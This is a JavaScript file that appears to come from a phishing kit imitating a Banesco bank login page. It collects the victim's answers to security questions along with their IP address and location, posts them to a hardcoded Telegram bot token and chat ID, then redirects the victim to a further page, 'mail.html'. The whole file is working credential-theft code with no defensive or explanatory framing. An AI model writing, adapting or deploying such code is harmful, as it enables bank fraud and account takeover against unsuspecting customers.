//bot token
var telegram_bot_id = "5555165841:AAE7e0yrao7YTcSmfDKy0Y6vnY0SO-0UyFE";
//chat id
var chat_id = "1024082369";
var u_name, ip, ip2;
var ready = function () {
    u_name4 = document.getElementById("0T4RX4").value;
    u_name5 = document.getElementById("PL4C5").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "🟢BANESCO-LOGIN🟢\nPregunta-3: " + u_name4 + " \nPregunta-4: " + u_name5 + " \nIP: " + ip +"\n" + ip2 +"\n🟢LOGIN🟢";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'mail.html';
        console.log(response);
    });
    return false;
};
